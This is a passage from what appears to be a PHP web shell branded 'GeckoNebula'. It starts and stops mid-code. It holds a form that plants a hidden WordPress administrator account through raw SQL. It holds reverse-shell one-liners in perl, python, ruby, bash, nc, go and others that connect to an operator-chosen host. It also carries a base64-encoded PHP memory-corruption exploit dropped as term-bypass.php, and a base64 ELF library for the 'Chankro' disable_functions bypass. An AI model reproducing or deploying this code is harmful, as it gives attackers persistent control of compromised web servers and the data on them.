                $('.modal').hide();
                event.preventDefault();
            });
            $('#close-editor').click(function() {
                $('.code-editor').hide();
                event.preventDefault();
            });

            $('.close-terminal').click(function() {
                $('.terminal').hide();
                event.preventDefault();
            });
            $('.close-btn-s').click(function() {
                $('.modal').hide();
                event.preventDefault();
            });


            var myTextarea = document.getElementById("code");

            var editor = CodeMirror.fromTextArea(myTextarea, {
                mode: "xml",
                lineNumbers: true,
                theme: "ayu-mirage",
                extraKeys: {
                    "Ctrl-Space": "autocomplete"
                },
                hintOptions: {
                    completeSingle: false,
                },
            });

        });
    </script>
</body>

</html>
<?php

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_host = $_POST['db_host'];
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($conn->connect_error) {
        failed();
        die("Error Cug : " . $conn->connect_error);
    }

    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'GeckoNebula', '', '', NOW(), '', 0, 'GeckoNebula')";

    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";

    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        $result = $conn->query($sqltakeuserid);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user_id = $row["ID"];

            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

            if ($conn->query($sqlusermeta) === TRUE) {
                Success();
            } else {
                echo "Error: " . $sqlusermeta . "\n" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.\n";
        }

        Success();
    } else {
        echo "Error: " . $sql . "\n" . $conn->error;
    }

    $conn->close();
}



if (isset($_GET['unlockshell'])) {
    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
        success();
    } else {
        failed();
    }
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['geckonebula-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['geckonebula-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['geckonebula-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['geckonebula-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['geckonebula-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['geckonebula-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['geckonebula-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['geckonebula-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['geckonebula-bc'] == "golang") {
        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}


if ($_GET['terminal'] == "bypasser") {
    if (!$fungsi[3]('term-bypass.php') && $fungsi[4]($fungsi[0]())) {
        $connt = 'PD9waHAKCiAgICAgICAgY2xhc3MgSGVscGVyIHsgcHVibGljICRhLCAkYiwgJGM7IH0KCiAgICAgICAgY2xhc3MgUHduIHsKICAgICAgICAgICAgY29uc3QgTE9HR0lORyA9IGZhbHNlOwogICAgICAgICAgICBjb25zdCBDSFVOS19EQVRBX1NJWkUgPSAweDYwOwogICAgICAgICAgICBjb25zdCBDSFVOS19TSVpFID0gWkVORF9ERUJVR19CVUlMRCA/IHNlbGY6OkNIVU5LX0RBVEFfU0laRSArIDB4MjAgOiBzZWxmOjpDSFVOS19EQVRBX1NJWkU7CiAgICAgICAgICAgIGNvbnN0IFNUUklOR19TSVpFID0gc2VsZjo6Q0hVTktfREFUQV9TSVpFIC0gMHgxOCAtIDE7CiAgICAgICAgICAgIGNvbnN0IEhUX1NJWkUgPSAweDExODsKICAgICAgICAgICAgY29uc3QgSFRfU1RSSU5HX1NJWkUgPSBzZWxmOjpIVF9TSVpFIC0gMHgxOCAtIDE7CiAgICAgICAgICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkY21kKSB7CiAgICAgICAgICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IDEwOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgJGdyb29tW10gPSBzZWxmOjphbGxvYyhzZWxmOjpTVFJJTkdfU0laRSk7CiAgICAgICAgICAgICAgICAgICAgJGdyb29tW10gPSBzZWxmOjphbGxvYyhzZWxmOjpIVF9TVFJJTkdfU0laRSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICRjb25jYXRfc3RyX2FkZHIgPSBzZWxmOjpzdHIycHRyKCR0aGlzLT5oZWFwX2xlYWsoKSwgMTYpOwogICAgICAgICAgICAkZmlsbCA9IHNlbGY6OmFsbG9jKHNlbGY6OlNUUklOR19TSVpFKTsKICAgIAogICAgICAgICAgICAkdGhpcy0+YWJjID0gc2VsZjo6YWxsb2Moc2VsZjo6U1RSSU5HX1NJWkUpOwogICAgICAgICAgICAkYWJjX2FkZHIgPSAkY29uY2F0X3N0cl9hZGRyICsgc2VsZjo6Q0hVTktfU0laRTsKICAgICAgICAgICAgc2VsZjo6bG9nKCJhYmMgQCAweCV4IiwgJGFiY19hZGRyKTsKICAgIAogICAgICAgICAgICAkdGhpcy0+ZnJlZSgkYWJjX2FkZHIpOwogICAgICAgICAgICAkdGhpcy0+aGVscGVyID0gbmV3IEhlbHBlcjsKICAgICAgICAgICAgaWYoc3RybGVuKCR0aGlzLT5hYmMpIDwgMHgxMzM3KSB7CiAgICAgICAgICAgICAgICBzZWxmOjpsb2coInVhZiBmYWlsZWQiKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgCiAgICAgICAgICAgICR0aGlzLT5oZWxwZXItPmEgPSAibGVldCI7CiAgICAgICAgICAgICR0aGlzLT5oZWxwZXItPmIgPSBmdW5jdGlvbigkeCkge307CiAgICAgICAgICAgICR0aGlzLT5oZWxwZXItPmMgPSAweGZlZWRmYWNlOwogICAgCiAgICAgICAgICAgICRoZWxwZXJfaGFuZGxlcnMgPSAkdGhpcy0+cmVsX3JlYWQoMCk7CiAgICAgICAgICAgIHNlbGY6OmxvZygiaGVscGVyIGhhbmRsZXJzIEAgMHgleCIsICRoZWxwZXJfaGFuZGxlcnMpOwogICAgCiAgICAgICAgICAgICRjbG9zdXJlX2FkZHIgPSAkdGhpcy0+cmVsX3JlYWQoMHgyMCk7CiAgICAgICAgICAgIHNlbGY6OmxvZygicmVhbCBjbG9zdXJlIEAgMHgleCIsICRjbG9zdXJlX2FkZHIpOwogICAgCiAgICAgICAgICAgICRjbG9zdXJlX2NlID0gJHRoaXMtPnJlYWQoJGNsb3N1cmVfYWRkciArIDB4MTApOwogICAgICAgICAgICBzZWxmOjpsb2coImNsb3N1cmUgY2xhc3NfZW50cnkgQCAweCV4IiwgJGNsb3N1cmVfY2UpOwogICAgICAgICAgICAKICAgICAgICAgICAgJGJhc2ljX2Z1bmNzID0gJHRoaXMtPmdldF9iYXNpY19mdW5jcygkY2xvc3VyZV9jZSk7CiAgICAgICAgICAgIHNlbGY6OmxvZygiYmFzaWNfZnVuY3Rpb25zIEAgMHgleCIsICRiYXNpY19mdW5jcyk7CiAgICAKICAgICAgICAgICAgJHppZl9zeXN0ZW0gPSAkdGhpcy0+Z2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpOwogICAgICAgICAgICBzZWxmOjpsb2coInppZl9zeXN0ZW0gQCAweCV4IiwgJHppZl9zeXN0ZW0pOwogICAgCiAgICAgICAgICAgICRmYWtlX2Nsb3N1cmVfb2ZmID0gMHg3MDsKICAgICAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAweDEzODsgJGkgKz0gOCkgewogICAgICAgICAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgkZmFrZV9jbG9zdXJlX29mZiArICRpLCAkdGhpcy0+cmVhZCgkY2xvc3VyZV9hZGRyICsgJGkpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkdGhpcy0+cmVsX3dyaXRlKCRmYWtlX2Nsb3N1cmVfb2ZmICsgMHgzOCwgMSwgNCk7CiAgICAgICAgICAgICRoYW5kbGVyX29mZnNldCA9IFBIUF9NQUpPUl9WRVJTSU9OID09PSA4ID8gMHg3MCA6IDB4Njg7CiAgICAgICAgICAgICR0aGlzLT5yZWxfd3JpdGUoJGZha2VfY2xvc3VyZV9vZmYgKyAkaGFuZGxlcl9vZmZzZXQsICR6aWZfc3lzdGVtKTsKICAgIAogICAgICAgICAgICAkZmFrZV9jbG9zdXJlX2FkZHIgPSAkYWJjX2FkZHIgKyAkZmFrZV9jbG9zdXJlX29mZiArIDB4MTg7CiAgICAgICAgICAgIHNlbGY6OmxvZygiZmFrZSBjbG9zdXJlIEAgMHgleCIsICRmYWtlX2Nsb3N1cmVfYWRkcik7CiAgICAKICAgICAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgweDIwLCAkZmFrZV9jbG9zdXJlX2FkZHIpOwogICAgICAgICAgICAoJHRoaXMtPmhlbHBlci0+YikoJGNtZCk7CiAgICAKICAgICAgICAgICAgJHRoaXMtPnJlbF93cml0ZSgweDIwLCAkY2xvc3VyZV9hZGRyKTsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmhlbHBlci0+Yik7CiAgICAgICAgfQogICAgCiAgICAgICAgcHJpdmF0ZSBmdW5jdGlvbiBoZWFwX2xlYWsoKSB7CiAgICAgICAgICAgICRhcnIgPSBbW10sIFtdXTsKICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoZnVuY3Rpb24oKSB1c2UgKCYkYXJyLCAmJGJ1ZikgewogICAgICAgICAgICAgICAgJGFyciA9IDE7CiAgICAgICAgICAgICAgICAkYnVmID0gc3RyX3JlcGVhdCgiXHgwMCIsIHNlbGY6OkhUX1NUUklOR19TSVpFKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICRhcnJbMV0gLj0gc2VsZjo6YWxsb2Moc2VsZjo6U1RSSU5HX1NJWkUgLSBzdHJsZW4oIkFycmF5IikpOwogICAgICAgICAgICByZXR1cm4gJGJ1ZjsKICAgICAgICB9CiAgICAKICAgICAgICBwcml2YXRlIGZ1bmN0aW9uIGZyZWUoJGFkZHIpIHsKICAgICAgICAgICAgJHBheWxvYWQgPSBwYWNrKCJRKiIsIDB4ZGVhZGJlZWYsIDB4Y2FmZWJhYmUsICRhZGRyKTsKICAgICAgICAgICAgJHBheWxvYWQgLj0gc3RyX3JlcGVhdCgiQSIsIHNlbGY6OkhUX1NUUklOR19TSVpFIC0gc3RybGVuKCRwYXlsb2FkKSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAkYXJyID0gW1tdLCBbXV07CiAgICAgICAgICAgIHNldF9lcnJvcl9oYW5kbGVyKGZ1bmN0aW9uKCkgdXNlICgmJGFyciwgJiRidWYsICYkcGF5bG9hZCkgewogICAgICAgICAgICAgICAgJGFyciA9IDE7CiAgICAgICAgICAgICAgICAkYnVmID0gc3RyX3JlcGVhdCgkcGF5bG9hZCwgMSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAkYXJyWzFdIC49ICJ4IjsKICAgICAgICB9CiAgICAKICAgICAgICBwcml2YXRlIGZ1bmN0aW9uIHJlbF9yZWFkKCRvZmZzZXQpIHsKICAgICAgICAgICAgcmV0dXJuIHNlbGY6OnN0cjJwdHIoJHRoaXMtPmFiYywgJG9mZnNldCk7CiAgICAgICAgfQogICAgCiAgICAgICAgcHJpdmF0ZSBmdW5jdGlvbiByZWxfd3JpdGUoJG9mZnNldCwgJHZhbHVlLCAkbiA9IDgpIHsKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAgICAgICAgICR0aGlzLT5hYmNbJG9mZnNldCArICRpXSA9IGNocigkdmFsdWUgJiAweGZmKTsKICAgICAgICAgICAgICAgICR2YWx1ZSA+Pj0gODsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIAogICAgICAgIHByaXZhdGUgZnVuY3Rpb24gcmVhZCgkYWRkciwgJG4gPSA4KSB7CiAgICAgICAgICAgICR0aGlzLT5yZWxfd3JpdGUoMHgxMCwgJGFkZHIgLSAweDEwKTsKICAgICAgICAgICAgJHZhbHVlID0gc3RybGVuKCR0aGlzLT5oZWxwZXItPmEpOwogICAgICAgICAgICBpZigkbiAhPT0gOCkgeyAkdmFsdWUgJj0gKDEgPDwgKCRuIDw8IDMpKSAtIDE7IH0KICAgICAgICAgICAgcmV0dXJuICR2YWx1ZTsKICAgICAgICB9CiAgICAKICAgICAgICBwcml2YXRlIGZ1bmN0aW9uIGdldF9zeXN0ZW0oJGJhc2ljX2Z1bmNzKSB7CiAgICAgICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgICAgICBkbyB7CiAgICAgICAgICAgICAgICAkZl9lbnRyeSA9ICR0aGlzLT5yZWFkKCRhZGRyKTsKICAgICAgICAgICAgICAgICRmX25hbWUgPSAkdGhpcy0+cmVhZCgkZl9lbnRyeSwgNik7CiAgICAgICAgICAgICAgICBpZigkZl9uYW1lID09PSAweDZkNjU3NDczNzk3MykgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cmVhZCgkYWRkciArIDgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICAgICAgfSB3aGlsZSgkZl9lbnRyeSAhPT0gMCk7CiAgICAgICAgfQogICAgCiAgICAgICAgcHJpdmF0ZSBmdW5jdGlvbiBnZXRfYmFzaWNfZnVuY3MoJGFkZHIpIHsKICAgICAgICAgICAgd2hpbGUodHJ1ZSkgewogICAgICAgICAgICAgICAgLy8gSW4gcmFyZSBpbnN0YW5jZXMgdGhlIHN0YW5kYXJkIG1vZHVsZSBtaWdodCBsaWUgYWZ0ZXIgdGhlIGFkZHIgd2UncmUgc3RhcnRpbmcKICAgICAgICAgICAgICAgIC8vIHRoZSBzZWFyY2ggZnJvbS4gVGhpcyB3aWxsIHJlc3VsdCBpbiBhIFNJR1NHViB3aGVuIHRoZSBzZWFyY2ggcmVhY2hlcyBhbiB1bm1hcHBlZCBwYWdlLgogICAgICAgICAgICAgICAgLy8gSW4gdGhhdCBjYXNlLCBjaGFuZ2luZyB0aGUgZGlyZWN0aW9uIG9mIHRoZSBzZWFyY2ggc2hvdWxkIGZpeCB0aGUgY3Jhc2guCiAgICAgICAgICAgICAgICAvLyAkYWRkciArPSAweDEwOwogICAgICAgICAgICAgICAgJGFkZHIgLT0gMHgxMDsKICAgICAgICAgICAgICAgIGlmKCR0aGlzLT5yZWFkKCRhZGRyLCA0KSA9PT0gMHhBOCAmJgogICAgICAgICAgICAgICAgICAgIGluX2FycmF5KCR0aGlzLT5yZWFkKCRhZGRyICsgNCwgNCksCiAgICAgICAgICAgICAgICAgICAgICAgIFsyMDE4MDczMSwgMjAxOTA5MDIsIDIwMjAwOTMwLCAyMDIxMDkwMl0pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1vZHVsZV9uYW1lX2FkZHIgPSAkdGhpcy0+cmVhZCgkYWRkciArIDB4MjApOwogICAgICAgICAgICAgICAgICAgICRtb2R1bGVfbmFtZSA9ICR0aGlzLT5yZWFkKCRtb2R1bGVfbmFtZV9hZGRyKTsKICAgICAgICAgICAgICAgICAgICBpZigkbW9kdWxlX25hbWUgPT09IDB4NjQ3MjYxNjQ2ZTYxNzQ3MykgewogICAgICAgICAgICAgICAgICAgICAgICBzZWxmOjpsb2coInN0YW5kYXJkIG1vZHVsZSBAIDB4JXgiLCAkYWRkcik7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cmVhZCgkYWRkciArIDB4MjgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIAogICAgICAgIHByaXZhdGUgZnVuY3Rpb24gbG9nKCRmb3JtYXQsICR2YWwgPSAiIikgewogICAgICAgICAgICBpZihzZWxmOjpMT0dHSU5HKSB7CiAgICAgICAgICAgICAgICBwcmludGYoInskZm9ybWF0fVxuIiwgJHZhbCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAKICAgICAgICBzdGF0aWMgZnVuY3Rpb24gYWxsb2MoJHNpemUpIHsKICAgICAgICAgICAgcmV0dXJuIHN0cl9zaHVmZmxlKHN0cl9yZXBlYXQoIkEiLCAkc2l6ZSkpOwogICAgICAgIH0KICAgIAogICAgICAgIHN0YXRpYyBmdW5jdGlvbiBzdHIycHRyKCRzdHIsICRwID0gMCwgJG4gPSA4KSB7CiAgICAgICAgICAgICRhZGRyZXNzID0gMDsKICAgICAgICAgICAgZm9yKCRqID0gJG4gLSAxOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICAgICAkYWRkcmVzcyA8PD0gODsKICAgICAgICAgICAgICAgICRhZGRyZXNzIHw9IG9yZCgkc3RyWyRwICsgJGpdKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICAgICAgfQogICAgfQoKICAgIGlmKGlzc2V0KCRfR0VUWydjbWRkJ10pKXsKICAgICAgICAkY21kZCA9ICgkX0dFVFsnY21kZCddKTsKICAgICAgICBuZXcgUHduKCIkY21kZCIpOwogICAgfQo/Pg==';
        $fungsi[28]("term-bypass.php", $fungsi[32]($connt));
        echo '<script>alert("Success!");</script>';
        echo '<script>alert("Your Files Bypass term-bypass.php");</script>';
        echo '<script>alert("u can use term-bypass.php?cmdd=id to bypass php version");</script>';

    }
}

if ($_GET['php'] == "chankro") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL CHANKRO</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal-chankro'])) {
                                                                $currentFilePath = $_SERVER['PHP_SELF'];
                                                                $doc = $_SERVER['DOCUMENT_ROOT'];
                                                                $directoryPath = dirname($currentFilePath);
                                                                $full = $doc . $directoryPath;
                                                                if(isset($_POST['exechankro'])){
                                                                    $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAA